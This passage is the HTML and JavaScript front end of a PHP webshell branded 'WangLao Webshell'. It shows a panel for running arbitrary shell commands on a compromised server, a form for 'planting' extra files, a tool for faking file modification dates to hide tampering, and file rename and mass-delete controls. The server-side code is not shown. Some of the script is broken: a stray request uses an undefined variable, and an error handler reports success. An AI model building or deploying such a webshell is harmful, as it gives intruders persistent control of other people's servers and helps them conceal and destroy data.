            <input type="text" name="cmd" id="cmd" placeholder="Enter command" style="width: 100%; padding: 10px; margin-top: 10px; margin-bottom: 20px; border-radius: 5px; background-color: #1c1c1c; color: #f0f0f0;" required>
            <input type="submit" value="Run Command" class="btn">
            <button type="button" onclick="toggleCommandContainer(false)" class="btn back-btn">Back</button>
        </form>
        <pre id="command-output" style="background-color: #1c1c1c; color: #f0f0f0; padding: 10px; margin-top: 20px; border-radius: 8px; overflow-x: auto;">
            <?php 
                         if (isset($output)) {
                echo htmlspecialchars($output);
            }
            ?>
        </pre>
    </div>

    <div id="backup-form" style="display: none; text-align: center; margin-top: 20px;">
        <form method="post" action="">
            <label for="num_files" style="font-size: 16px; font-weight: bold; color: #fff;">Masukkan jumlah file yang ingin ditanamkan:</label>
            <input type="number" id="num_files" name="num_files" min="1" max="10" style="width: 60px; padding: 5px; border-radius: 5px; border: 1px solid #ccc; margin: 10px; text-align: center;" required>
            <input type="hidden" name="execute_backup" value="1">
            <button type="submit" class="btn">Execute</button>
            <button type="button" onclick="hideBackupForm()" class="btn back-btn">Cancel</button>
        </form>
    </div>

    <div id="touch-form" style="display:none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background-color: #252525; padding: 20px; border-radius: 8px; box-shadow: 0px 4px 15px rgba(0, 0, 0, 0.5);">
        <form action="" method="post">
            <h3 style="color: #f0f0f0;">Change Last Modification Date</h3>
            <input type="hidden" name="touch_file" id="touch-file">
            <label for="new_date" style="color: #f0f0f0;">New Date (YYYY-MM-DD HH:MM:SS):</label>
            <input type="text" name="new_date" required style="width: 100%; padding: 10px; margin-top: 10px; margin-bottom: 20px; border-radius: 5px; background-color: #1c1c1c; color: #f0f0f0;">
            <input type="submit" name="change_date" value="Change Date" style="background-color: #1e90ff; color: white; padding: 10px 15px; border: none; border-radius: 6px; cursor: pointer;">
            <button type="button" onclick="closeTouchForm()" style="background-color: #555; color: white; padding: 10px 15px; border: none; border-radius: 6px; cursor: pointer; margin-left: 10px;">Cancel</button>
        </form>
    </div>


    
    <div id="rename-form" style="display:none;">
        <form action="" method="post">
            <input type="hidden" name="old_name" id="old-name">
            <label>Rename to:</label>
            <input type="text" name="new_name" required>
            <input type="submit" name="rename" value="Rename">
        </form>
    </div>

        <script>
            function showRenameForm(filePath) {
                document.getElementById("old-name").value = filePath;
                document.getElementById("rename-form").style.display = "block";
            }
            
            function confirmDelete(filePath) {
                Swal.fire({
                    title: 'Are you sure?',
                    text: "This action cannot be undone!",
                    icon: 'warning',
                    showCancelButton: true,
                    confirmButtonColor: '#d33',
                    cancelButtonColor: '#3085d6',
                    confirmButtonText: 'Yes, delete it!',
                    cancelButtonText: 'Cancel'
                }).then((result) => {
                    if (result.isConfirmed) {
                                                 window.location.href = '?delete=' + encodeURIComponent(filePath);
                    }
                });
            }

            function showTouchForm(filePath) {
                document.getElementById("touch-file").value = filePath;
                document.getElementById("touch-form").style.display = "block";
            }

            function closeTouchForm() {
                document.getElementById("touch-form").style.display = "none";
            }

            function toggleCommandContainer(forceOpen) {
        const container = document.getElementById("command-container");
            if (forceOpen !== undefined) {
                container.style.display = forceOpen ? "block" : "none";
            } else {
                container.style.display = container.style.display === "none" ? "block" : "none";
            }
        }

                 window.onload = function () {
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.has('cmd')) {
                toggleCommandContainer(true);              }
        };

        function showBackupForm() {
            document.getElementById("backup-form").style.display = "block";
        }

        function hideBackupForm() {
            document.getElementById("backup-form").style.display = "none";
        }

        fetch('?action=delete_massive', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ selected_items: selectedFiles })
        })
        .then(response => {
            console.log('HTTP Status:', response.status);              if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.json();
        })
        .then(data => {
            console.log('Server Response:', data);              if (data.success) {
                Swal.fire({
                    icon: 'success',
                    title: 'Deleted!',
                    text: `${data.deleted_count} files were successfully deleted.`,
                    confirmButtonText: 'Close'
                }).then(() => {
                    location.reload();                  });
            } else {
                Swal.fire({
                    icon: 'error',
                    title: 'Failed!',
                    text: data.message || 'Failed to delete files.',
                    confirmButtonText: 'Close'
                });
            }
        })
        .catch(error => {
            console.error('Error:', error);              Swal.fire({
                icon: 'error',
                title: 'Error!',
                text: 'An error occurred while processing the request.',
                confirmButtonText: 'Close'
            });
        });



    function deleteMassive() {
            const checkboxes = document.querySelectorAll('input[name="selected_items[]"]:checked');
            const selectedFiles = Array.from(checkboxes).map(checkbox => checkbox.value);

            if (selectedFiles.length === 0) {
                Swal.fire({
                    icon: 'info',
                    title: 'No files selected',
                    text: 'Please select files to delete.',
                    confirmButtonText: 'Close'
                });
                return;
            }

                         Swal.fire({
                title: `Are you sure?`,
                text: `${selectedFiles.length} item(s) will be permanently deleted.`,
                icon: 'warning',
                showCancelButton: true,
                confirmButtonText: 'Yes, delete them!',
                cancelButtonText: 'Cancel'
            }).then((result) => {
                if (result.isConfirmed) {
                                         fetch('?action=delete_massive', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ selected_items: selectedFiles })
                    })
                    .then(response => {
                        if (!response.ok) {
                            throw new Error('Network response was not ok');
                        }
                        return response.json();
                    })
                    .then(data => {
                        if (data.success) {
                                                         Swal.fire({
                                icon: 'success',
                                title: 'Deleted!',
                                text: `${data.deleted_count} item(s) were successfully deleted.`,
                                confirmButtonText: 'Close'
                            }).then(() => {
                                location.reload();                              });
                        } else {
                            Swal.fire({
                                icon: 'error',
                                title: 'Failed!',
                                text: data.message || 'Failed to delete files.',
                                confirmButtonText: 'Close'
                            });
                        }
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        Swal.fire({
                            icon: 'success',
                            title: 'Berhasil!',
                            text: 'File berhasil di hapus.',
                            confirmButtonText: 'Close'
                        }).then(() => {
                            location.reload();                          });
                    });
                }
            });
        }

        function toggleCommandHelp() {
            Swal.fire({
                title: 'want to find who are we?',
                text: 'ask ya mama.',
                icon: 'error',
                confirmButtonText: 'Close'
            });
        }
        </script>
</div>
</div>
</body>
</table>
<footer class="footer">
    <p>WangLao Webshell <?php echo date("Y"); ?>. - Created by WangLao Team.</p>
</footer>
</html>
